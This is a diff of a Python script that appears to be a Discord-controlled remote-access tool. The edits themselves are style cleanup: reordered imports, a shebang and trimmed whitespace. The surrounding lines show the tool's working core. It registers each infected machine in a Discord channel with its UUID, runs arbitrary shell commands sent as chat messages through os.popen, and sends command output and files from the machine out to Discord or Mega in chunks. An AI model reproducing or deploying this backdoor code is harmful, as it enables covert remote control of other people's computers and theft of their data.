@@ -1,12 +1,15 @@
-import config
-import discord
-from discord.ext import commands
+#!/usr/bin/env python3
 import io
-from mega import Mega
 import os
 import platform
 import subprocess
 import sys
+
+import discord
+from discord.ext import commands
+from mega import Mega
+
+import config
 
 
 TEXT_SIZE_MAX = 1992
@@ -32,7 +35,7 @@ async def on_ready():
     category = await create_category(guild)
 
     # Get a list of the text channels in the server
-    channels = guild.text_channels    
+    channels = guild.text_channels
 
     # Create 'sierra-hotel-'
     channel = await create_channel(category, channels)
@@ -111,7 +114,7 @@ async def machine_info():
         for line in get_UUID:
             UUID = " ".join(get_UUID.split())
             machine_UUID = UUID[5:]
-    
+
     elif platform.system() == "Linux":
         machine_UUID = str(subprocess.check_output(
             ["cat", "/etc/machine-id"]).decode().strip())
@@ -147,14 +150,14 @@ async def on_message(message):
 # Helper function for upload, uploads given file name to Mega
 async def mega_upload(filename):
     await channel.send(f"Uploading `{filename}` to Mega, standby...")
-    
+
     mega_upload = mega_nz.upload(filename)
     mega_link = mega_nz.get_upload_link(mega_upload)
-    
+
     await channel.send(f"Mega link of uploaded file: {mega_link}")
 
 
-# Uploads given file in chunks 
+# Uploads given file in chunks
 # The file size should be checked before the function call
 async def upload_chunks(filename):
     await channel.send("Splitting your file and uploading the parts, "
@@ -162,7 +165,7 @@ async def upload_chunks(filename):
 
     with open(filename, "rb") as file:
         chunk = file.read(FILE_SIZE_MAX)
-        
+
         i = 1
         while chunk:
             uploadname = f"{filename}-{i}"
@@ -187,21 +190,21 @@ async def upload(filename):
         await channel.send("File not found")
         return
 
-    # If the user has Mega key, and the filesize is less then 
+    # If the user has Mega key, and the filesize is less then
     # mega_size_max, then upload the file to Mega
     if hasMegaKey and filesize <= MEGA_SIZE_MAX and filesize > FILE_SIZE_MAX:
         await mega_upload(filename)
-    
+
     else:
         if filesize <= FILE_SIZE_MAX:
             await channel.send(f"Uploading `{filename}`, standby...")
             await channel.send(file=discord.File(filename))
-        
-        # If filesize is bigger then 7.5 MB, and less then or equal to 
+
+        # If filesize is bigger then 7.5 MB, and less then or equal to
         # 4*(7.5 MB), upload file chunk by chunk (max 4 chunks)
         elif FILE_SIZE_MAX < filesize <= CHUNKED_FILE_SIZE_MAX:
             await upload_chunks(filename)
-        
+
         else:
             await channel.send("File is too big")
 
@@ -212,7 +215,7 @@ async def upload_chunks_from_memory(data):
 
     data = [data[i:i + FILE_SIZE_MAX]
             for i in range(0, len(data), FILE_SIZE_MAX)]
-    
+
     i = 1
 
     for chunk in data:
@@ -231,7 +234,7 @@ async def upload_from_memory(data, n):
                            f"your output will be sent as `{filename}`")
         await channel.send(file=discord.File(io.BytesIO(data),
                                              filename=filename))
-    
+
     elif n <= CHUNKED_FILE_SIZE_MAX:
         await upload_chunks_from_memory(data)
 
@@ -241,7 +244,7 @@ async def handle_user_input(content):
 
     try:
         user_input = os.popen(content).read()
-    
+
     except:
         await channel.send("Error reading command output.")
         return
@@ -272,7 +275,7 @@ async def handle_user_input(content):
 
         for page in paginator.pages:
             await channel.send(f"{page}")
-    
+
     elif CHUNKED_TEXT_SIZE_MAX < output_length <= CHUNKED_FILE_SIZE_MAX:
         await upload_from_memory(user_input.encode("utf-8", "ignore"),
                                  output_length)
@@ -280,7 +283,7 @@ async def handle_user_input(content):
     elif output_length > CHUNKED_FILE_SIZE_MAX:
         await channel.send("Output size is too big. If you are "
                            "trying to read a file, try uploading it.")
-    
+
     else:
         await channel.send("Unknown error.")
 
